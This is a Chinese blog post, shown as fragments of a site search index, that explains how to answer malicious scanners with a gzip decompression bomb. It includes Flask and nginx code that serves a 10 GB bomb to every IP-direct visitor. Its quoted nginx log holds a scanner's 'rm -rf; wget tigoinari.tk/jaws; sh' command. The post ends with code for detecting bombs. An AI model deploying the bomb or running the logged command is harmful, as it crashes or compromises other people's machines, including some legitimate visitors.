\u968f\u4fbf\u53d6\uff0c\u53d6\u4ec0\u4e48\u503c\u90fd\u6ca1\u6709\u5173\u7cfb\uff0c\u8bf7\u6ce8\u610f\u4e0d\u8981\u548c\u5df2\u5b9a\u4e49\u7684 server_name \u91cd\u590d\uff0c\u6240\u4ee5\u4e00\u822c\u662f\u91c7\u7528 _ \u3002 \u73b0\u5728\uff0c\u6240\u6709\u672a\u88ab server_name \u5339\u914d\u5230\u7684\u8bf7\u6c42\uff08\u4e00\u822c\u6765\u8bf4\u5c31\u662f\u901a\u8fc7 IP \u5730\u5740\u76f4\u63a5\u8bbf\u95ee80\u7aef\u53e3\u7684\u8bf7\u6c42\uff09\u90fd\u4f1a\u88ab default_server \u5904\u7406\uff0c\u5e76\u4e14\u8fd4\u56de 403 Forbidden \u3002 \u7136\u540e\u6211\u4eec\u518d\u5728\u539f\u6709\u7684 server_name localhost \u7684\u57fa\u7840\u4e0a\u8865\u5145\u4e00\u4e2a 127.0.0.1 \uff0c\u5426\u5219\u6211\u4eec\u5728\u672c\u5730\u8fde\u63a5\u5230 127.0.0.1:80 \u65f6\u4f1a\u5403\u5230\u81ea\u5df1\u8bbe\u4e0b\u7684 403\u3002 \u8fd8\u6709\u8c01\u4f1a\u5403\u5230403 \u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u4e2a\u65b9\u6848\u662f\u4e3a\u4e86\u6355\u83b7\u901a\u8fc7\u6211\u4eec\u670d\u52a1\u5668\u7684\u516c\u7f51 IP \u5730\u5740\u76f4\u63a5\u8bbf\u95ee80\u7aef\u53e3\u7684\u8bf7\u6c42\uff0c\u4f46\u662f\u8fd8\u6709\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5\u4e5f\u4f1a\u88ab default_server \u6355\u83b7\uff1a \u6211\u4eec\u90e8\u7f72\u4e86\u4e00\u4e2a\u6b63\u5e38\u7684 http \u670d\u52a1\uff0c\u5e76\u4e14\u5728 DNS \u4e0a\u8bbe\u7f6e\u4e86\u5230\u81ea\u5df1\u670d\u52a1\u5668\u7684 A/AAAA/CNAME \u8bb0\u5f55\uff0c\u4f46\u662f\u5374\u5fd8\u8bb0\u5728 nginx \u4e2d\u5c06\u8bb0\u5f55\u503c\uff08\u57df\u540d\uff09\u8bbe\u7f6e\u6210 server_name \u4e86\u3002 \u6211\u4eec\u5728 DNS \u4e0a\u8bbe\u7f6e\u4e86\u5230\u81ea\u5df1\u670d\u52a1\u5668\u7684 A/AAAA/CNAME \u8bb0\u5f55\uff0c\u4f46\u662f\u8fd9\u4e2a\u57df\u540d\u5bf9\u5e94\u7684\u670d\u52a1\u5e76\u4e0d\u662f http \u670d\u52a1\uff08\u4f8b\u5982 sql\u3001ftp \u7b49\uff09\uff0c\u5e76\u4e14\u76d1\u542c\u7aef\u53e3\u4e5f\u4e0d\u662f80\uff0c\u4f46\u5f88\u78b0\u5de7\uff0c\u6709\u4eba\u6b63\u8bd5\u56fe\u901a\u8fc780\u7aef\u53e3\u8bbf\u95ee\u8fd9\u4e2a\u57df\u540d\u3002 \u6709\u4eba\u5c06\u4ed6\u81ea\u5df1\u7684\u57df\u540d\u6076\u610f\u89e3\u6790\u5230\u6211\u4eec\u7684\u670d\u52a1\u5668\u4e0a\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u65e5\u5fd7\u4e2d\u7684 host \u503c\u5c06\u4f1a\u663e\u793a\u4ed6\u7684\u57df\u540d\u3002 \u72e0\u4e00\u70b9\u7684\u5904\u7406\u65b9\u6cd5\uff08\u672c\u756a\uff09 \u00b6 \u8fd9\u91cc\u662f\u672c\u756a\uff0c\u4e3b\u8981\u4ecb\u7ecd\u5982\u4f55\u7528 gzip \u538b\u7f29\u5305\u70b8\u5f39\u5bf9\u6076\u610f\u626b\u63cf\u5668\u8fdb\u884c\u53cd\u51fb\u3002 \u4ec0\u4e48\u662f\u538b\u7f29\u5305\u70b8\u5f39 \u00b6 \u9996\u5148\u7b80\u8981\u4ecb\u7ecd\u4e0b\u4ec0\u4e48\u662f\u538b\u7f29\u5305\u70b8\u5f39\uff08\u4e5f\u53eb zip \u70b8\u5f39\uff09\uff1a \u4ec0\u4e48\u662f\u538b\u7f29\u5305\u70b8\u5f39 \u4e00\u4e2a zip \u70b8\u5f39\u901a\u5e38\u662f\u4e00\u4e2a\u5c0f\u6587\u4ef6\uff0c\u4fbf\u4e8e\u4f20\u8f93\u4e5f\u907f\u514d\u88ab\u6000\u7591\u3002\u4f46\u662f\uff0c\u89e3\u538b\u7f29\u6587\u4ef6\u65f6\uff0c\u5b83\u7684\u5185\u5bb9\u5c31\u4f1a\u8d85\u51fa\u7cfb\u7edf\u7684\u5904\u7406\u80fd\u529b\u3002zip \u70b8\u5f39\u4e0d\u4f1a\u963b\u6b62\u7a0b\u5e8f\u7684\u6b63\u5e38\u8fd0\u884c\uff0c\u800c\u662f\u8ba9\u7a0b\u5e8f\u5de5\u4f5c\uff0c\u4f46\u662f\u6587\u4ef6\u91cc\u7684\u6863\u6848\u662f\u7cbe\u5fc3\u8bbe\u8ba1\u7684\uff0c\u56e0\u6b64\u8981\u89e3\u538b\u7f29\u6587\u4ef6\u65f6\uff08\u6bd4\u5982\u7528\u75c5\u6bd2\u626b\u63cf\u7a0b\u5e8f\u6765\u7ed9\u5b83\u626b\u63cf\u75c5\u6bd2\uff09\uff0c\u5c31\u9700\u8981\u82b1\u8d39\u5927\u91cf\u65f6\u95f4\u3001\u78c1\u76d8\u7a7a\u95f4\u548c\u5185\u5b58\u3002 \u7ef4\u57fa\u767e\u79d1 \u4e5f\u5c31\u662f\u8bf4\u5c0f\u5c0f\u7684\u51e0\u5341 KB \u7684\u538b\u7f29\u5305\u53ef\u4ee5\u89e3\u538b\u51fa\u6570 GB \u7684\u6570\u636e\uff0c\u518d\u5927\u4e00\u70b9\u7684\u538b\u7f29\u5305\u751a\u81f3\u53ef\u4ee5\u89e3\u538b\u51fa\u51e0 TB \u751a\u81f3\u51e0 PB \u7684\u6570\u636e\u3002 \u5982\u679c\u5c1d\u8bd5\u5c06\u8fd9\u4e9b\u6570\u636e\u89e3\u538b\u5728\u786c\u76d8\u91cc\uff0c\u5219\u4f1a\u5bfc\u81f4\u786c\u76d8 IO \u76f4\u63a5100%\uff1b\u5982\u679c\u5c1d\u8bd5\u5c06\u8fd9\u4e9b\u6570\u636e\u89e3\u538b\u5230\u5185\u5b58\u4e2d\uff0c\u4f1a\u5bfc\u81f4\u5185\u5b58\u5360\u7528\u7387\u4e0d\u65ad\u4e0a\u5347\uff0c\u76f4\u5230 OOM\u3002 gzip \u538b\u7f29\u5305\u70b8\u5f39\u5982\u4f55\u5de5\u4f5c \u00b6 \u73b0\u4ee3\u6d4f\u89c8\u5668\u4e2d\uff08\u5f53\u7136\u4e5f\u5305\u62ec\u5404\u4e2a\u8bed\u8a00\u7684\u7f51\u7edc\u8bf7\u6c42\u5e93\uff0c\u4f8b\u5982 python \u7684 requests \uff09\u901a\u5e38\u90fd\u53ef\u4ee5\u5904\u7406\u4ee5 gzip \u65b9\u5f0f\u538b\u7f29\u7684 html \u54cd\u5e94\uff08\u8f7d\u8377\uff09\u3002 \u8bbe\u60f3\u4e00\u4e2a\u626b\u63cf\u5668\uff0c\u4ed6\u5c1d\u8bd5\u901a\u8fc7\u4f60\u7684\u516c\u7f51 IP \u626b\u63cf\u4f60\u7684\u670d\u52a1\u5668\uff0c\u6211\u4eec\u4ece\u67d0\u4e9b\u65b9\u5f0f\u4e86\u89e3\u5230\u8fd9\u662f\u4e00\u4e2a\u626b\u63cf\u5668\u540e\uff0c\u6545\u610f\u8fd4\u56de\u4e00\u4e2a\u4ee5 gzip \u65b9\u5f0f\u538b\u7f29\u7684 html \u54cd\u5e94\uff0c\u4f46\u662f\u8fd9\u4e2a\u54cd\u5e94\u5728\u89e3\u538b\u51fa\u6765\u4e4b\u540e\u6709\u8db3\u8db3\u6570 GB\uff0c\u4f1a\u600e\u4e48\u6837\uff1f \u6ca1\u9519\uff0c\u8fd9\u4e2a\u53ef\u601c\u800c\u611a\u8822\u7684\u626b\u63cf\u5668\u4f1a\u8bd5\u56fe\u89e3\u538b\u8fd9\u4e2a\u8f7d\u8377\uff0c\u968f\u540e\uff0c\u4ed6\u5185\u5b58\u5c06\u4f1a\u88ab\u6570 GB \u7684\u5783\u573e\u6240\u586b\u6ee1\uff0c\u7136\u540e OOM\u3002 \u8fd9\u5c31\u662f\u6211\u4eec\u60f3\u8981\u8fbe\u5230\u7684\u6548\u679c\u2014\u2014\u4f7f\u7528 gzip \u538b\u7f29\u5305\u70b8\u5f39\u53cd\u51fb\u6076\u610f\u626b\u63cf\u5668\u3002 \u5236\u9020\u5e76\u90e8\u7f72\u5728\u672c\u5730 \u00b6 \u4e3a\u4e86\u6d4b\u8bd5\uff0c\u9996\u5148\u5236\u9020\u4e00\u4e2a\u4ec5\u5305\u542b test \u4e3a\u5185\u5bb9\u7684\u538b\u7f29\u6587\u4ef6\u4f5c\u4e3a\u8f7d\u8377\uff1a echo \"test\" | gzip > test.gzip \u6211\u4eec\u90e8\u7f72\u4e00\u4e2a\u7b80\u6613\u7684 Flask \u670d\u52a1\u5668\uff0c\u5e76\u8ba9\u5176\u5c06\u6211\u4eec\u5728\u4e0a\u6587\u5236\u9020\u7684 test.gzip \u4f5c\u4e3a\u538b\u7f29\u540e\u7684\u54cd\u5e94\uff1a app.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 from flask import Flask , Response , request import logging app = Flask ( __name__ ) @app . route ( '/' , defaults = { 'path' : '' }) @app . route ( '/<path:path>' ) def send_gzip_bomb ( path ): remote_addr = request . headers . get ( 'X-Forwarded-For' , request . remote_addr ) app . logger . info ( f 'client [ { remote_addr } ] { request . method } [ { request . host } ] as { request . url } ' ) app . logger . info ( f 'User-Agent: { request . headers . get ( \"User-Agent\" ) } ' ) with open ( r 'static/test.gzip' , 'rb' ) as payload_gzip : resp = payload_gzip . read () final_response = Response ( response = resp , status = 200 , mimetype = 'text/html' ) final_response . headers [ 'Content-Encoding' ] = 'gzip' return final_response if __name__ == '__main__' : logging . basicConfig ( filename = 'flask.log' , level = logging . INFO ) app . run ( host = '127.0.0.1' , port = 8082 ) \u8fd9\u4e2a\u7b80\u6613\u7684 Flask \u670d\u52a1\u5668\u7684\u4ee3\u7801\u4e2d\u6709\u4ee5\u4e0b\u8981\u70b9\uff1a \u7b2c7\u884c - @app . route ( '/' , defaults = { 'path' : '' }) \uff1a\u5f53\u5339\u914d\u5230 '/' \u7684\u8def\u7531\u65f6\uff08\u6bd4\u5982\u76f4\u63a5\u8bbf\u95ee http:// + \u4f60\u7684\u516c\u7f51 IP \u5730\u5740 \uff09\uff0c\u5c06 send_gzip_bomb \u51fd\u6570\u7684 path \u53c2\u6570\u8bbe\u7f6e\u6210 '' \u7b2c8\u884c - @app . route ( '/<path:path>' )) \uff1a\u5f53\u5339\u914d\u5230\u4efb\u4f55\u5e26 path \u7684\u8def\u7531\u65f6\uff0c\u5c06 send_gzip_bomb \u51fd\u6570\u7684 path \u53c2\u6570\u8bbe\u7f6e\u6210 URL \u4e2d\u7684 path \u503c \u5982\u6b64\u4e00\u6765\uff0c\u8fd9\u4e2a send_gzip_bomb \u51fd\u6570\u4fbf\u80fd\u6355\u83b7\u6240\u6709\u7684\u8def\u7531\uff08\u5373\u4f7f\u51fd\u6570\u4e2d\u4ece\u672a\u4f7f\u7528 path \u53c2\u6570\uff09\u3002 \u7b2c10\u884c - 'X-Forwarded-For' \uff1a\u53d6\u51fa\u8bf7\u6c42\u5934\u4e2d\u7684 X-Forwarded-For \u7684\u503c\uff0c\u4ece\u800c\u77e5\u9053\u662f\u8c01\u8bbf\u95ee\u4e86\u6211\u4eec\u7684\u670d\u52a1\u5668\u3002\u5982\u679c\u76f4\u63a5\u4f7f\u7528 request . remote_addr \uff0c\u90a3\u4e48\u67e5\u770b\u5230\u7684\u5730\u5740\u6c38\u8fdc\u90fd\u662f 127.0.0.1 \uff0c\u56e0\u4e3a\u8fd9\u4e2a\u8bf7\u6c42\u662f\u4ece\u672c\u5730\u7684 nginx \u53d1\u6765\u7684 \u63d0\u793a \u4f7f\u7528 X-Real-IP \u66ff\u4ee3 X-Forwarded-For \u540c\u6837\u4e5f\u53ef\u4ee5\uff0c\u524d\u63d0\u662f\u8fd9\u4e24\u4e2a\u503c\u5728 nginx \u53cd\u4ee3\u65f6\u5df2\u7ecf\u88ab\u5b9a\u4e49\u3002 \u89c1 \u90e8\u7f72\u4e8e nginx \u7b2c16\u884c - mimetype = 'text/html' \uff1a\u5728\u54cd\u5e94\u5934\u4e2d\u6307\u5b9a\u54cd\u5e94\u7c7b\u578b\u4e3a\u6587\u672c\uff0c\u8fd9\u6837\u88ab\u5bb3\u7684\u626b\u63cf\u5668\u670d\u52a1\u5668\u4fbf\u4f1a\u65e0\u6761\u4ef6\u89e3\u538b\u6211\u4eec\u53d1\u6765\u7684\u8f7d\u8377 \u7b2c17\u884c - final_response . headers [ 'Content-Encoding' ] = 'gzip' \uff1a\u540c\u4e0a\uff0c\u544a\u77e5\u88ab\u5bb3\u7684\u626b\u63cf\u5668\u670d\u52a1\u5668\u4f7f\u7528 gzip \u89e3\u538b\u8f7d\u8377 \u7b2c22\u884c - filename = 'flask.log' \uff1a\u5c06 Flask \u7684\u65e5\u5fd7\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6587\u4ef6\uff0c\u65b9\u4fbf\u6211\u4eec\u8bb0\u5f55\u662f\u8c01\u6076\u610f\u8bbf\u95ee\u4e86\u6211\u4eec\u7684\u670d\u52a1\u5668 \u73b0\u5728\uff0c\u8fd0\u884c\u8fd9\u4e2a Flask \u670d\u52a1\u5668\uff0c\u5e76\u8bbf\u95ee http://127.0.0.1:8082 \u3002 \u53ef\u4ee5\u770b\u5230\uff0c\u6d4f\u89c8\u5668\u6210\u529f\u8fd8\u539f\u4e86 test \u7684\u6587\u672c\u5185\u5bb9\u3002 \u73b0\u5728\uff0c\u6211\u4eec\u5236\u4f5c\u4e00\u4e9b\u9ad8\u538b\u7f29\u7387\u7684\u8f7d\u8377\u3002 dd if = /dev/zero bs = 1M count = 1024 | gzip > 1G.gzip dd if = /dev/zero bs = 1M count = 10240 | gzip > 10G.gzip \u53d7\u5236\u4e8e DEFLATE \u7684\u6781\u9650\u538b\u7f29\u7387\uff0c\u4e0a\u8ff0\u4e24\u4e2a\u6587\u4ef6\u6700\u591a\u80fd\u88ab\u538b\u7f29\u5230\u5176\u539f\u6765\u5927\u5c0f\u7684\u7ea6 1/1000\u3002\u5373\u7ea6 1 MB \u7684 1G.gzip \u548c \u7ea6 10 MB \u7684 10G.gzip \u3002 \u7136\u540e\u518d\u8bbf\u95ee\u4e00\u6b21 http://127.0.0.1:8082 \u3002 \u53ef\u4ee5\u89c1\u5230\u5185\u5b58\u5360\u7528\u6b63\u5728\u4e0d\u65ad\u4e0a\u6da8\uff0c\u56e0\u4e3a\u6211\u6015\u6211\u7535\u8111 OOM \u6240\u4ee5\u5c31\u6ca1\u6709\u7ee7\u7eed\u6d4b\u8bd5\u4e0b\u53bb\u4e86\u3002 \u90e8\u7f72\u4e8e nginx \u00b6 \u73b0\u5728\uff0c\u6211\u4eec\u9700\u8981\u5c06\u5176\u90e8\u7f72\u5230\u6211\u4eec\u7684\u670d\u52a1\u5668\u4e0a\uff0c\u8fd9\u6837\u624d\u80fd\u5c06\u5176\u4f5c\u4e3a\u53cd\u51fb\u5de5\u5177\u4f7f\u7528\u3002 \u4fee\u6539\u5148\u524d\u63d0\u5230\u7684 nginx \u7684\u914d\u7f6e\uff1a nginx.conf\uff08\u90e8\u5206\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 server { listen 80 default_server ; listen [::]:80 default_server ; server_name _ ; # \u4f7f\u7528 zipbomb_server \u6765\u7528\u6b66\u529b\u89e3\u51b3\u626b\u63cf\u5668\u95ee\u9898 location / { proxy_set_header Host $host ; proxy_set_header X-Real-IP $remote_addr ; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for ; proxy_pass http://127.0.0.1:8082 ; } } server { listen 80 ; listen [::]:80 ; server_name localhost 127 .0.0.1 ; ... } \u4e4b\u524d\u6211\u4eec\u662f return 403 ; \uff0c\u73b0\u5728\u6211\u4eec\u628a default_server \u6240\u5728\u7684 server \u6dfb\u52a0\u4e00\u4e2a / \u7684 location \uff0c\u5e76\u5c06\u539f\u6765\u8fd4\u56de403\u6539\u4e3a\u53cd\u4ee3\u5230 127.0.0.1:8082 \u3002 \u6ce8\u610f\u7b2c10\u884c\uff0c\u6211\u4eec\u9700\u8981\u5411\u53cd\u4ee3\u7684\u8bf7\u6c42\u5934\u4e2d\u653e\u4e0a\u4e00\u4e2a X-Forwarded-For \uff0c\u4ee5\u8868\u793a nginx \u5e2e\u52a9\u54ea\u4e2a\u5ba2\u6237\u7aef\u8fdb\u884c\u4e86\u53cd\u5411\u4ee3\u7406\u3002\u6b64\u65f6\u6211\u4eec\u7684 Flask \u670d\u52a1\u5668\u624d\u80fd\u77e5\u9053\u8bbf\u95ee\u4e86\u6211\u4eec\u7684\u670d\u52a1\u5668\u7684\u5ba2\u6237\u7aef\u7684 IP \u5730\u5740\u3002 \u5982\u6b64\u4e00\u6765\uff0c\u6240\u6709\u901a\u8fc7\u6211\u4eec\u670d\u52a1\u5668\u7684\u516c\u7f51 IP \u5730\u5740\u8bbf\u95ee\u670d\u52a1\u566880\u7aef\u53e3\u7684\u8fde\u63a5\uff0c\u65e0\u8bba path \u4e3a\u5982\u4f55\uff0c\u5747\u4f1a\u88ab\u53cd\u4ee3\u5230 Flask \u670d\u52a1\u5668\u4e0a\uff0c\u7136\u540e Flask \u670d\u52a1\u5668\u8fd4\u56de\u4e00\u4e2a 10G \u7684 gzip \u70b8\u5f39\uff0c\u662f\u4e0d\u662f\u5f88\u70ab\u9177\uff1f \u9884\u9632\u65b9\u6cd5 \u00b6 \u6700\u4e3b\u8981\u7684\u9884\u9632\u65b9\u6cd5\u5c31\u662f\u5728\u67e5\u770b\u54cd\u5e94\u5185\u5bb9\u4e4b\u524d\u68c0\u67e5\u54cd\u5e94\u7684\u539f\u59cb\u5927\u5c0f\u3002 import gzip import io import requests import sys resp = requests . get ( url ) compressed = resp . raw . read () compressed_size = sys . getsizeof ( compressed ) with gzip . open ( io . BytesIO ( compressed ), 'rb' ) as g : g . seek ( 0 , 2 ) origin_size = g . tell () print ( compressed_size , origin_size ) \u5176\u4e2d origin_size \u53cd\u6620\u7684\u662f\u8f7d\u8377\u89e3\u538b\u4e4b\u540e\u7684\u5927\u5c0f\uff0c compressed_size \u53cd\u6620\u7684\u662f\u8f7d\u8377\u538b\u7f29\u540e\u7684\u5927\u5c0f\uff08\u4e5f\u662f\u5b9e\u9645\u4f20\u8f93\u7684\u5927\u5c0f\uff09\uff0c\u5b83\u4eec\u7684\u5355\u4f4d\u90fd\u662f B\u3002 \u5982\u679c\u53d1\u73b0\u8fd9\u4e24\u4e2a\u503c\u7684\u6bd4\u503c\u8fc7\u5927\uff0c\u90a3\u4e48\u8fd9\u4e2a\u8f7d\u8377\u5f88\u6709\u53ef\u80fd\u662f\u538b\u7f29\u5305\u70b8\u5f39\u3002","title":"\u5982\u4f55\u4f7f\u7528 gzip \u538b\u7f29\u5305\u70b8\u5f39\u5bf9\u6076\u610f\u626b\u63cf\u5668\u8fdb\u884c\u53cd\u51fb"},{"location":"blog/2022/220421-use-gzip-bomb-against-scanner/#_1","text":"cat /var/log/nginx/error.log \u7136\u540e\u53d1\u73b0 nginx \u65e5\u5fd7\u91cc\u5168\u662f\u626b\u63cf\u5668\u7684 404\uff0c\u8ba9\u6211\u4eec\u653e\u4e24\u4e2a\u4e0a\u6765\u5c55\u793a\u4e00\u4e0b\uff1a 2022/04/21 06:45:30 [error] 3281302#3281302: *239 open() \"/usr/share/nginx/html/GponForm/diag_Form\" failed (2: No such file or directory), client: XXX.XXX.XXX.XXX, server: localhost, request: \"POST /GponForm/diag_Form?images/ HTTP/1.1\", host: \"XXX.XXX.XXX.XXX\" 2022/04/21 20:36:23 [error] 3281302#3281302: *1497 open() \"/usr/share/nginx/html/shell\" failed (2: No such file or directory), client: XXX.XXX.XXX.XXX, server: localhost, request: \"GET /shell?cd+/tmp;rm+-rf+*;wget+ tigoinari.tk/jaws;sh+/tmp/jaws HTTP/1.1\", host: \"XXX.XXX.XXX.XXX\" \u5f88\u70e6\uff0c\u4e00\u5806\u626b\u63cf\u5668\u5728\u626b\u6211\u7684\u914d\u7f6e\uff0c\u53e6\u4e00\u5806\u626b\u63cf\u5668\u5728\u5e2e\u6211\u8c03\u7528 nginx \u7684 shell \u6765 rm -rf * \uff0c\u8fd8\u6709\u4e00\u5806\u626b\u63cf\u5668\u5728\u5e2e\u6211\u6267\u884c\u6076\u610f\u811a\u672c\u3002 \u4e0d\u5f97\u4e0d\u8bf4\uff0c\u626b\u914d\u7f6e\u7684\u626b\u63cf\u5668\u867d\u7136\u6ca1\u4ec0\u4e48\u4f24\u5bb3\u529b\uff0c\u4f46\u662f\u5929\u5929\u7ed9 error.log \u52a0\u65e0\u610f\u4e49\u7684 log\uff0c\u672c\u8d28\u4e0a\u4e5f\u7b97\u662f\u4e00\u79cd\u9a9a\u6270\u4e86\u3002\u4f46\u662f\u6267\u884c\u811a\u672c\u7684\u6211\u771f\u7684\u770b\u4e0d\u4e0b\u53bb\u4e86\uff0c\u800c\u4e14\u4e07\u4e00\u54ea\u5929\u51fa\u4e86\u4e2a\u67d0\u67d0\u6f0f\u6d1e\uff0c\u7136\u540e\u771f\u6267\u884c\u6210\u529f\u4e86\u5462\uff0c\u770b\u6765\u5f97\u7528\u70b9\u624b\u6bb5\u5904\u7406\u6389\u3002","title":"\u8d77\u56e0"},{"location":"blog/2022/220421-use-gzip-bomb-against-scanner/#_2","text":"\u6076\u610f\u626b\u63cf\u5668\u626b\u7f51\u7ad9\uff0c\u6839\u636e\u65e5\u5fd7\u4e2d\u663e\u793a\u7684 host \u7684\u503c\u53ef\u4ee5\u5206\u4e3a\u4e09\u4e2a\u60c5\u51b5\uff1a host \u662f\u81ea\u5df1\u7684\u516c\u7f51 IP\uff1a\u8bf4\u660e\u626b\u63cf\u5668\u5728\u516c\u7f51\u4e0a\u626b IP \u6bb5\uff0c\u5e76\u4e14\u901a\u8fc7 IP \u5730\u5740\u76f4\u63a5\u8bbf\u95ee\u4f60\u7684\u4e3b\u673a\u768480\u7aef\u53e3 host \u662f 127.0.0.1 \u6216 localhost \uff1a\u8bf4\u660e\u626b\u63cf\u5668\u626b\u7684\u662f\u4f60\u7684\u57df\u540d\uff0c\u5e76\u901a\u8fc7 nginx \u53cd\u4ee3\u5230\u4e86 localhost host \u662f\u4f60\u7684\u57df\u540d\uff1a\u8bf4\u660e\u626b\u63cf\u5668\u722c\u7684\u662f\u4f60\u7684\u57df\u540d \u540e\u4e24\u79cd\u60c5\u51b5\u53ef\u4ee5\u4ea4\u7ed9 Cloudflare \u89e3\u51b3\uff0c\u628a\u5b89\u5168\u6027\u9762\u677f\u4e0a\u7684 \u6258\u7ba1\u89c4\u5219 \u6253\u5f00\u5c31\u884c\uff08\u53ef\u60dc\u73b0\u5728\u6682\u65f6\u8fd8\u7528\u4e0d\u4e86\uff0c\u5f97\u7b49 cf \u4e0a\u7ebf\uff09\u3002 \u8f7b\u677e\u914d\u7f6e\u548c\u90e8\u7f72 Cloudflare \u51ed\u501f\u4fdd\u62a4\u6570\u767e\u4e07\u4e2a\u5e94\u7528\u7a0b\u5e8f\u7684\u7ecf\u9a8c\u6784\u5efa\u7684\u89c4\u5219\u3002Cloudflare \u514d\u8d39\u6258\u7ba1\u89c4\u5219\u96c6\u5373\u5c06\u4e0a\u7ebf\uff01 https://blog.cloudflare.com/waf-for-everyone/ \uff08\u6572\u7897\u7b49 cf \u4e0a\u7ebf\u514d\u8d39\u6258\u7ba1\u89c4\u5219\u96c6\uff09 \u672c\u6587\u7740\u91cd\u8ba8\u8bba\u7b2c\u4e00\u79cd\u60c5\u51b5\u3002\u7b2c\u4e00\u79cd\u60c5\u51b5\u53ef\u4ee5\u4f7f nginx \u963b\u6b62\u6240\u6709\u7684\u901a\u8fc7 IP \u5730\u5740\u76f4\u63a5\u8bbf\u95ee80\u7aef\u53e3\u7684\u8bf7\u6c42\uff0c\u5177\u4f53\u8bbe\u7f6e\u5982\u4e0b\uff1a nginx.conf\uff08\u90e8\u5206\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 server { listen 80 default_server ; listen [::]:80 default_server ; server_name _ ; return 403 ; } server { listen 80 ; listen [::]:80 ; server_name localhost 127 .0.0.1 ; ... } nginx \u7684 default_server \u6307\u4ee4\u53ef\u4ee5\u5b9a\u4e49\u9ed8\u8ba4\u7684 server \u53bb\u5904\u7406\u4e00\u4e9b\u6ca1\u6709\u5339\u914d\u5230 server_name \u7684\u8bf7\u6c42\uff0c\u5982\u679c\u6ca1\u6709\u663e\u5f0f\u5b9a\u4e49\uff0c\u5219\u4f1a\u9009\u53d6\u7b2c\u4e00\u4e2a\u5b9a\u4e49\u7684 server \u4f5c\u4e3a default_server \u3002\uff08\u89c1 nginx \u7684 default_server \u5b9a\u4e49\u53ca\u5339\u914d\u89c4\u5219 \uff09 \u8fd9\u91cc\u6211\u4eec\u663e\u5f0f\u5b9a\u4e49\u4e00\u4e2a default_server \uff0c\u5176 server_name \u968f\u4fbf\u53d6\uff0c\u53d6\u4ec0\u4e48\u503c\u90fd\u6ca1\u6709\u5173\u7cfb\uff0c\u8bf7\u6ce8\u610f\u4e0d\u8981\u548c\u5df2\u5b9a\u4e49\u7684 server_name \u91cd\u590d\uff0c\u6240\u4ee5\u4e00\u822c\u662f\u91c7\u7528 _ \u3002 \u73b0\u5728\uff0c\u6240\u6709\u672a\u88ab server_name \u5339\u914d\u5230\u7684\u8bf7\u6c42\uff08\u4e00\u822c\u6765\u8bf4\u5c31\u662f\u901a\u8fc7 IP \u5730\u5740\u76f4\u63a5\u8bbf\u95ee80\u7aef\u53e3\u7684\u8bf7\u6c42\uff09\u90fd\u4f1a\u88ab default_server \u5904\u7406\uff0c\u5e76\u4e14\u8fd4\u56de 403 Forbidden \u3002 \u7136\u540e\u6211\u4eec\u518d\u5728\u539f\u6709\u7684 server_name localhost \u7684\u57fa\u7840\u4e0a\u8865\u5145\u4e00\u4e2a 127.0.0.1 \uff0c\u5426\u5219\u6211\u4eec\u5728\u672c\u5730\u8fde\u63a5\u5230 127.0.0.1:80 \u65f6\u4f1a\u5403\u5230\u81ea\u5df1\u8bbe\u4e0b\u7684 403\u3002 \u8fd8\u6709\u8c01\u4f1a\u5403\u5230403 \u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u4e2a\u65b9\u6848\u662f\u4e3a\u4e86\u6355\u83b7\u901a\u8fc7\u6211\u4eec\u670d\u52a1\u5668\u7684\u516c\u7f51 IP \u5730\u5740\u76f4\u63a5\u8bbf\u95ee80\u7aef\u53e3\u7684\u8bf7\u6c42\uff0c\u4f46\u662f\u8fd8\u6709\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5\u4e5f\u4f1a\u88ab default_server \u6355\u83b7\uff1a \u6211\u4eec\u90e8\u7f72\u4e86\u4e00\u4e2a\u6b63\u5e38\u7684 http \u670d\u52a1\uff0c\u5e76\u4e14\u5728 DNS \u4e0a\u8bbe\u7f6e\u4e86\u5230\u81ea\u5df1\u670d\u52a1\u5668\u7684 A/AAAA/CNAME \u8bb0\u5f55\uff0c\u4f46\u662f\u5374\u5fd8\u8bb0\u5728 nginx \u4e2d\u5c06\u8bb0\u5f55\u503c\uff08\u57df\u540d\uff09\u8bbe\u7f6e\u6210 server_name \u4e86\u3002 \u6211\u4eec\u5728 DNS \u4e0a\u8bbe\u7f6e\u4e86\u5230\u81ea\u5df1\u670d\u52a1\u5668\u7684 A/AAAA/CNAME \u8bb0\u5f55\uff0c\u4f46\u662f\u8fd9\u4e2a\u57df\u540d\u5bf9\u5e94\u7684\u670d\u52a1\u5e76\u4e0d\u662f http \u670d\u52a1\uff08\u4f8b\u5982 sql\u3001ftp \u7b49\uff09\uff0c\u5e76\u4e14\u76d1\u542c\u7aef\u53e3\u4e5f\u4e0d\u662f80\uff0c\u4f46\u5f88\u78b0\u5de7\uff0c\u6709\u4eba\u6b63\u8bd5\u56fe\u901a\u8fc780\u7aef\u53e3\u8bbf\u95ee\u8fd9\u4e2a\u57df\u540d\u3002 \u6709\u4eba\u5c06\u4ed6\u81ea\u5df1\u7684\u57df\u540d\u6076\u610f\u89e3\u6790\u5230\u6211\u4eec\u7684\u670d\u52a1\u5668\u4e0a\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u65e5\u5fd7\u4e2d\u7684 host \u503c\u5c06\u4f1a\u663e\u793a\u4ed6\u7684\u57df\u540d\u3002","title":"\u6e29\u548c\u7684\u5904\u7406\u65b9\u6cd5"},{"location":"blog/2022/220421-use-gzip-bomb-against-scanner/#_3","text":"\u8fd9\u91cc\u662f\u672c\u756a\uff0c\u4e3b\u8981\u4ecb\u7ecd\u5982\u4f55\u7528 gzip 